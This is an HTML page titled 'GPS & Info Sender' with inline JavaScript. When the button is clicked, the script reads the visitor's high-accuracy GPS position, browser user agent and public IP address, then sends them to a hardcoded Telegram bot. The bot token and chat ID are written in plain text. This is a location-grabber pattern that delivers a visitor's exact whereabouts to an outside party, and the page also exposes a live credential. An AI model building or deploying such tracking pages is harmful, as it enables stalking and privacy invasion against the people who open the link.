<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>GPS & Info Sender</title>
</head>
<body style="font-family:Tahoma, sans-serif; text-align:center; margin-top:50px;">

<h2>Click the button below to send your location and info</h2>
<button id="getLocation" style="padding:10px 20px; font-size:16px; cursor:pointer;">Send Info</button>

<script>
const TELEGRAM_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
const CHAT_ID = "6978055162";

async function getIP() {
  try {
    let res = await fetch('https://api.ipify.org?format=json');
    let data = await res.json();
    return data.ip;
  } catch {
    return "IP not available";
  }
}

function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML"
    })
  });
}

document.getElementById("getLocation").onclick = async () => {
  if (!navigator.geolocation) {
    alert("Sorry, your browser does not support GPS.");
    return;
  }

  let ip = await getIP();
  let userAgent = navigator.userAgent;

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      let lat = pos.coords.latitude.toFixed(6);
      let lon = pos.coords.longitude.toFixed(6);
      let accuracy = pos.coords.accuracy;

      let message = `
📍 <b>User Location</b>:
Latitude: <code>${lat}</code>
Longitude: <code>${lon}</code>
Accuracy: <code>${accuracy} meters</code>

💻 <b>User Agent</b>: 
<code>${userAgent}</code>

🌐 <b>IP Address</b>: 
<code>${ip}</code>
      `;
      sendToTelegram(message);
      alert("Your information has been sent.");
    },
    (error) => {
      alert("Permission denied or an error occurred while getting location.");
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
};
</script>

</body>
</html>